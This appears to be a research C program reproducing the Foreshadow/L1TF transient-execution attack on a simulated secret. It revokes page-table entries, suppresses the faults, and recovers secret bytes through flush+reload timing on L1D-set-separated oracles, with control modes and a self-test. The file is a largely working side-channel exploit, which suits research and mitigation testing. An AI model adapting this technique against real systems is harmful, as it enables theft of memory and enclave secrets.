/*
 * GGSEC modifications and additions:
 * Copyright (C) 2026 Maciej Gojny, GG Advanced IT Security UG
 */
/*
 *  Decisive experiment: was the recovered byte read *transiently*?
 *
 *  The reproduction in harness/main.c recovers the secret (64/64), but its
 *  SIGSEGV handler re-presents the page (`MARK_PRESENT` + `mprotect(READ|WRITE)`),
 *  so the faulting load is re-executed *architecturally* and the oracle slot can
 *  be filled by an ordinary read. That makes the result inconclusive with respect
 *  to transient execution.
 *
 *  This program removes that ambiguity: the fault handler does NOT touch the
 *  mapping, it redirects RIP past the whole transient block. The secret-dependent
 *  oracle access therefore never happens architecturally -- only whatever the
 *  out-of-order engine did before the fault was delivered can leave a trace in L1D.
 *
 *  Decoding follows the paper's structure, one candidate value at a time: flush
 *  candidate slot v, run the transient block once, reload slot v. Each round is a
 *  self-contained experiment (the page is re-revoked and the secret line's L1D
 *  residency is re-established), which is what makes the measurement meaningful.
 *
 *  Modes and controls (environment variables):
 *
 *    HANDLER=skip|restore   skip  : handler jumps past the block (no architectural
 *                                   re-execution; the interesting case)
 *                           restore: handler re-presents the page (old behaviour,
 *                                   architectural re-execution possible)
 *    PFN=keep|zero          keep  : PTE keeps the physical address, P=0 (the
 *                                   Foreshadow/L1TF precondition)
 *                           zero  : physical address cleared as well (what the
 *                                   kernel's PTE-inversion mitigation produces)
 *    RELOAD=0|1             whether the secret cache line is (re)loaded into L1D
 *                           right before the measurement. RELOAD=0 flushes it
 *                           instead, as the "no secret in L1D" control.
 *    TRIALS=<n>             repeats per byte, to show decoding stability
 *
 *  Expected outcome for the controls (to be measured, not assumed):
 *
 *    skip   + keep  + reload=1  -> if this recovers the secret, the leak happened
 *                                  without any architectural access
 *    skip   + zero  + reload=1  -> must recover nothing
 *    skip   + keep  + reload=0  -> must recover nothing (L1D residency required)
 *    restore+ zero  + reload=1  -> recovers the secret although the PTE carries no
 *                                  physical address, which is exactly why the old
 *                                  handler could not distinguish the two cases
 *
 *  No SGX, no Intel SDK, no dependency on libsgxstep/transient.S (the block below
 *  is local, so the unbounded `jz retry` of the library is not involved either).
 *
 *  The single speculative execution of the block encodes the byte into two
 *  independent traces -- the low six bits into one oracle, the high two bits into
 *  another -- because this L1D cannot tell which line of a set was accessed (see the
 *  SLOT_SIZE comment). A byte counts as recovered when both traces decode their
 *  class correctly.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <time.h>
#include <sys/mman.h>
#include <ucontext.h>

#include "libsgxstep/config.h"
#include "libsgxstep/pt.h"
#include "libsgxstep/sched.h"
#include "libsgxstep/debug.h"
#include "libsgxstep/cache.h"

#define SLOT_SIZE       0x1040 /* 4 KiB plus one cache line. This stride is what makes the
                                * measurement possible, and the reason was measured, not
                                * assumed: with a 4 KiB stride every candidate sits at
                                * offset 0 of its page, so all 256 of them share one L1D
                                * set ((addr>>6)&63 advances by 64 == 0 mod 64). An access
                                * to ANY line of that set between the flush and the reload
                                * makes the freshly flushed line read back fast again -- the
                                * kernel's fault-handling traffic alone is enough. Observed
                                * with minimal probes: flush + load(same set) + reload -> 47
                                * cycles (hit), the same probe with the intervening load in a
                                * different set -> 308 cycles (miss), and that holds even
                                * when the intervening load targets a different array.
                                * 0x1040 advances the set index by one per candidate, so at
                                * most 4 of the 256 candidates share a set and only those
                                * four can be polluted by the access the transient block
                                * actually performs. */
#define SECRET_BYTES    64
#define SECRET_CACHE_LINE 27
#define HOT_CYCLES      150    /* reload time below which a candidate counts as hot */
#define LO_CLASSES      64     /* the low six bits of the leaked byte  */
#define HI_CLASSES      4      /* the high two bits of the leaked byte */

/* -------------------------------------------------------------------------
 * Simulated secret: same layout as upstream app/foreshadow/sim-enclave.c
 * ------------------------------------------------------------------------- */

uint8_t __attribute__ ((aligned(0x1000))) array[1000];
#define secret array[(SECRET_BYTES * SECRET_CACHE_LINE)]

/*
 * Oracle, split into the two traces that a set-indexed measurement can tell apart:
 *
 *   oracle_lo[value & 0x3f] : one slot per low six bits, 64 slots in 64 DIFFERENT
 *                             L1D sets (the stride advances the set index by one)
 *   oracle_hi[value >> 6]   : one slot per high two bits, 4 slots, likewise in
 *                             four different sets
 *
 * The paper indexes 256 slots by the whole byte. That cannot be decoded on this L1D:
 * an access to any line of a set makes the other (freshly flushed) lines of the same
 * set read back fast, so the four candidates that share a set with the line the
 * transient access touches all appear hot together -- reproduced exactly by the
 * self-test, which always reports {v, v+64, v+128, v+192} for a touched v. Keeping
 * one slot per distinguishable class gives every candidate its own set, so exactly
 * one of them can be hot, and 6 bits + 2 bits still add up to the whole byte.
 */
char __attribute__ ((aligned(0x1000))) oracle_lo[SLOT_SIZE * LO_CLASSES];
char __attribute__ ((aligned(0x1000))) oracle_hi[SLOT_SIZE * HI_CLASSES];

/* -------------------------------------------------------------------------
 * Attack state
 * ------------------------------------------------------------------------- */

void *secret_ptr = NULL, *secret_page = NULL, *alias_ptr = NULL, *alias_page = NULL;
uint64_t *pte_alias = NULL;
uint64_t pte_present = 0x0;      /* valid PTE: P=1, PFN kept  */
uint64_t pte_keep    = 0x0;      /* P=0, PFN kept            */
uint64_t pte_zero    = 0x0;      /* P=0, PFN cleared         */

static int trials = 3;           /* TRIALS=<n>    */
static int pfn_keep = 1;         /* PFN=keep|zero */
static int reload_secret = 1;    /* RELOAD=0|1    */
static int noblock = 0;          /* NOBLOCK=1: run the measurement loop without the
                                  * transient block at all -- the control that shows
                                  * where a trace does and does not come from */

static void *volatile skip_to = NULL;
static volatile unsigned long fault_count = 0;
static int restore_in_handler = 0;

/* -------------------------------------------------------------------------
 * SIGSEGV handling: either suppress architecturally, or re-present the page
 * ------------------------------------------------------------------------- */

static void fault_handler( int sig, siginfo_t *si, void *ctx )
{
    ucontext_t *uc = (ucontext_t *) ctx;

    fault_count++;

    if (!restore_in_handler)
    {
        /* resume right after the transient block: the oracle access is never
         * executed architecturally */
        uc->uc_mcontext.gregs[REG_RIP] = (greg_t) skip_to;
        return;
    }

    /* old behaviour: make the page usable again, so the faulting instruction is
     * re-executed and the whole block runs architecturally */
    *pte_alias = MARK_PRESENT(pte_present);
    if (mprotect(alias_page, 0x1000, PROT_READ | PROT_WRITE) != 0)
    {
        const char msg[] = "[leaktest] mprotect failed in handler\n";
        write(STDERR_FILENO, msg, sizeof(msg) - 1);
        _exit(3);
    }
}

/* -------------------------------------------------------------------------
 * The transient block
 *
 * The fault handler redirects execution to label 2, i.e. past the secret-dependent
 * oracle access. Everything before that label only happened speculatively.
 * ------------------------------------------------------------------------- */

/*
 * The block exists twice, once per trace, and each variant performs exactly one
 * speculative access. They must not both be executed in the same round: the two
 * oracles tile the same 64 L1D sets (64 classes need all of them), so the access of
 * one trace would make a candidate of the other trace look hot as well. One trace per
 * run keeps exactly one candidate hot, which is what the decoder needs.
 *
 * The byte is loaded into %al and used immediately, so no register is declared as
 * both an input and a clobber.
 */
static inline void leak_round_lo( void *base, void *adrs )
{
    asm volatile(
        "   lea 2f(%%rip), %%rax\n\t"
        "   mov %%rax, %0\n\t"
        "1: movb (%1), %%al\n\t"             /* faults on the revoked mapping */
        "   movzbl %%al, %%eax\n\t"
        "   and $0x3f, %%eax\n\t"             /* low six bits */
        "   imul %3, %%rax\n\t"               /* rax = (value & 0x3f) * SLOT_SIZE */
        "   movq (%2, %%rax), %%rdi\n\t"      /* data-dependent access into oracle_lo */
        "2:\n\t"
        : "=m"(skip_to)
        : "r"(adrs), "r"(base), "r"((unsigned long) SLOT_SIZE)
        : "rax", "rdi", "memory");
}

static inline void leak_round_hi( void *base, void *adrs )
{
    asm volatile(
        "   lea 2f(%%rip), %%rax\n\t"
        "   mov %%rax, %0\n\t"
        "1: movb (%1), %%al\n\t"             /* faults on the revoked mapping */
        "   movzbl %%al, %%eax\n\t"
        "   shr $6, %%eax\n\t"                /* high two bits */
        "   imul %3, %%rax\n\t"               /* rax = (value >> 6) * SLOT_SIZE */
        "   movq (%2, %%rax), %%rdi\n\t"      /* data-dependent access into oracle_hi */
        "2:\n\t"
        : "=m"(skip_to)
        : "r"(adrs), "r"(base), "r"((unsigned long) SLOT_SIZE)
        : "rax", "rdi", "memory");
}

/* Bring the secret cache line into L1D (same idiom as upstream sim-enclave.c). */
static inline void reload_secret_line( void *adrs )
{
    asm volatile(
        "movl (%0), %%eax\n\t"
        : : "c" (adrs)
        : "%rax");
}

/* -------------------------------------------------------------------------
 * Oracle decoding: flush one candidate, run the block once, reload the candidate
 * ------------------------------------------------------------------------- */

/*
 * One trace is decoded with the flush/reload structure of the Foreshadow paper, one
 * candidate class at a time: flush the slot of class c, let the block run once (it
 * faults, and the handler decides whether that stays suppressed), reload the same
 * slot. Because every class lives in its own L1D set, nothing else that happens in
 * between can make this candidate look hot, so the argument of the minimum is the
 * class the block used -- provided the block left a trace at all.
 */
static int decode_trace( void *base, int classes, int high, char *adrs,
                         uint64_t *best_t, uint64_t *second_t, int *hot_count )
{
    int c, best = -1;
    uint64_t t, b = ~0ULL, s = ~0ULL;

    *hot_count = 0;

    for (c = 0; c < classes; c++)
    {
        char *slot = (char *) base + (c * SLOT_SIZE);

        /* 1. re-arm the revoked PTE, 2. make the secret line resident in L1D (or
         *    keep it out, as the control), 3. leave this candidate cold -- all
         *    three for every single round */
        *pte_alias = pfn_keep ? pte_keep : pte_zero;
        if (reload_secret)
            reload_secret_line(secret_ptr);
        else
            flush(secret_ptr);
        flush(slot);

        /* 4. one transient attempt of the trace we are decoding, unless the caller
         *    asked for the no-block control */
        if (!noblock)
        {
            if (high)
                leak_round_hi(base, adrs);
            else
                leak_round_lo(base, adrs);
        }

        /* 5. a hot candidate means the speculative access went into this class */
        t = reload(slot);
        if (t < HOT_CYCLES)
            (*hot_count)++;
        if (t < b)      { s = b; b = t; best = c; }
        else if (t < s) { s = t; }
    }

    *best_t = b;
    *second_t = s;
    return best;
}

/*
 * Privilege-free stand-in for decode_trace(): the same flush/reload structure, but
 * the two accesses of the transient block are performed architecturally instead of
 * faulting. It validates the decoder and the oracle geometry without /dev/mem.
 */
static int decode_arch( int value, int high,
                        uint64_t *best_t, uint64_t *second_t, int *hot_count )
{
    void *base = high ? (void *) oracle_hi : (void *) oracle_lo;
    int classes = high ? HI_CLASSES : LO_CLASSES;
    int c, best = -1;
    uint64_t t, b = ~0ULL, s = ~0ULL;

    *hot_count = 0;

    for (c = 0; c < classes; c++)
    {
        char *slot = (char *) base + (c * SLOT_SIZE);

        flush(slot);
        /* the single access the matching block variant performs, done architecturally */
        reload((char *) base + (((high ? (value >> 6) : (value & 0x3f))) * SLOT_SIZE));
        t = reload(slot);

        if (t < HOT_CYCLES)
            (*hot_count)++;
        if (t < b)      { s = b; b = t; best = c; }
        else if (t < s) { s = t; }
    }

    *best_t = b;
    *second_t = s;
    return best;
}

/* -------------------------------------------------------------------------
 * Main
 * ------------------------------------------------------------------------- */

int main( int argc, char **argv )
{
    int i, j;
    int mismatch[8] = {0};
    unsigned seed = (unsigned) time(NULL) ^ (unsigned) getpid();
    struct sigaction sa;

    setvbuf(stdout, NULL, _IOLBF, 0);

    /*
     * SELFTEST: exercise the oracle and the decoder without any attack. Touches
     * known slots architecturally and checks that the decoder finds them. Needs
     * no privileges (nothing here touches /dev/mem). If this fails, every
     * measurement of the attack modes below is meaningless.
     */
    if (getenv("SELFTEST"))
    {
        static const int values[] = { 0, 1, 17, 128, 236, 255 };
        int n = (int) (sizeof(values) / sizeof(values[0]));

        /*
         * Timing sanity first: a hot line must be far cheaper than a flushed one,
         * otherwise every attack measurement below is meaningless.
         */
        {
            char *p = oracle_lo + (7 * SLOT_SIZE);
            unsigned long cold, hot;

            flush(p);
            cold = reload(p);
            hot = reload(p);
            info("timing sanity: cold=%lu hot=%lu", cold, hot);
        }

        /*
         * Why the oracle is laid out the way it is -- three numbers, all measured:
         * two slots 4 KiB apart land in the same L1D set, and touching one of them
         * makes the freshly flushed other one read back as a hit again. That is why
         * every candidate class below gets a set of its own, and why the paper's
         * 256-slot byte oracle cannot be decoded on this L1D: its four candidates per
         * set always appear hot together.
         */
        {
            static char __attribute__ ((aligned(0x1000))) probe_area[SLOT_SIZE * 2];
            unsigned long alone, same_set, other_set;

            flush(probe_area);
            alone = reload(probe_area);

            flush(probe_area);
            reload(probe_area + 0x1000);             /* 4 KiB away: same L1D set */
            same_set = reload(probe_area);

            flush(probe_area);
            reload(probe_area + 0x40);               /* +1 set, same page */
            other_set = reload(probe_area);

            info("probe: flush+reload=%lu, +load(same set)+reload=%lu, "
                 "+load(other set)+reload=%lu",
                 alone, same_set, other_set);
        }

        for (i = 0; i < n; i++)
        {
            uint64_t b = 0, s = 0;
            int v = values[i] & 0xff;
            int hot_lo = 0, hot_hi = 0;
            int lo = decode_arch(v, 0, &b, &s, &hot_lo);
            int hi = decode_arch(v, 1, &b, &s, &hot_hi);

            info("selftest: touched=0x%02x lo=%2d (%d hot) hi=%d (%d hot) -> %s",
                 v, lo, hot_lo, hi, hot_hi,
                 (lo == (v & 0x3f) && hi == (v >> 6)) ? "OK" : "MISMATCH");
        }
        return 0;
    }

    if (getenv("HANDLER"))  restore_in_handler = !strcmp(getenv("HANDLER"), "restore");
    if (getenv("PFN"))      pfn_keep = strcmp(getenv("PFN"), "zero");
    if (getenv("RELOAD"))   reload_secret = atoi(getenv("RELOAD"));
    if (getenv("NOBLOCK"))  noblock = atoi(getenv("NOBLOCK"));
    if (getenv("TRIALS"))   trials = atoi(getenv("TRIALS"));
    if (getenv("SEED"))     seed = (unsigned) strtoul(getenv("SEED"), NULL, 0);
    if (trials > 8)         trials = 8;

    srand(seed);
    info("leaktest seed: 0x%08x; trials: %d", seed, trials);
    info("mode: handler=%s pfn=%s reload=%d block=%s",
         restore_in_handler ? "restore" : "skip",
         pfn_keep ? "keep" : "zero", reload_secret, noblock ? "absent" : "present");

    /* the secret */
    for (i = 0; i < SECRET_BYTES; i++)
        array[(SECRET_BYTES * SECRET_CACHE_LINE) + i] = rand();
    secret_ptr  = &secret;
    secret_page = (void *) ((uint64_t) secret_ptr & ~UINT64_C(0xfff));

    /* pin to the victim CPU; no APIC/ISR setup here -- this test only needs
     * page faults, and keeping the timer out of the measurement window is
     * exactly what we want */
    ASSERT( !claim_cpu(VICTIM_CPU) );

    memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = fault_handler;
    sa.sa_flags = SA_SIGINFO;
    ASSERT( !sigaction(SIGSEGV, &sa, NULL) );

    /* alias mapping + PTE handle */
    alias_ptr  = remap_page_table_level(secret_ptr, PAGE);
    alias_page = (void *) ((uint64_t) alias_ptr & ~UINT64_C(0xfff));
    ASSERT( pte_alias = remap_page_table_level(alias_ptr, PTE) );

    pte_present = *pte_alias;
    pte_keep    = MARK_NOT_PRESENT(pte_present);
    pte_zero    = pte_keep & ~((uint64_t) PT_PHYS_MASK);
    info("secret at %p; alias at %p; PTE %#lx", secret_ptr, alias_ptr, pte_present);

    for (j = 0; j < trials; j++)
    {
        for (i = 0; i < SECRET_BYTES; i++)
        {
            uint64_t best_t = 0, second_t = 0, best_hi = 0, second_hi = 0;
            unsigned long faults_before;
            int slot, lo = -1, hi = -1, hot_lo = 0, hot_hi = 0;

            /* revoke the alias once per byte: PROT_NONE makes the kernel invert the
             * PTE, and then our own PTE value decides what physical address the page
             * keeps. decode_trace() re-arms that value before every candidate round,
             * which is what keeps each round an independent experiment. */
            ASSERT( !mprotect(alias_page, 0x1000, PROT_NONE) );

            faults_before = fault_count;
            lo = decode_trace(oracle_lo, LO_CLASSES, 0, (char *) alias_ptr + i,
                              &best_t, &second_t, &hot_lo);
            hi = decode_trace(oracle_hi, HI_CLASSES, 1, (char *) alias_ptr + i,
                              &best_hi, &second_hi, &hot_hi);
            slot = (lo < 0 || hi < 0) ? -1 : ((hi << 6) | lo);

            if (slot != array[(SECRET_BYTES * SECRET_CACHE_LINE) + i])
                mismatch[j]++;

            info("t%d byte %2d: true=0x%02x decoded=%3d lo=%2d(%d hot,%lu cyc) "
                 "hi=%d(%d hot,%lu cyc) faults=%lu",
                 j, i, array[(SECRET_BYTES * SECRET_CACHE_LINE) + i], slot,
                 lo, hot_lo, best_t, hi, hot_hi, best_hi, fault_count - faults_before);

            /* make the page usable again for the next byte */
            *pte_alias = pte_present;
            ASSERT( !mprotect(alias_page, 0x1000, PROT_READ | PROT_WRITE) );
        }
    }

    for (j = 0; j < trials; j++)
        info("trial %d: mismatched bytes = %d/%d", j, mismatch[j], SECRET_BYTES);

    return 0;
}
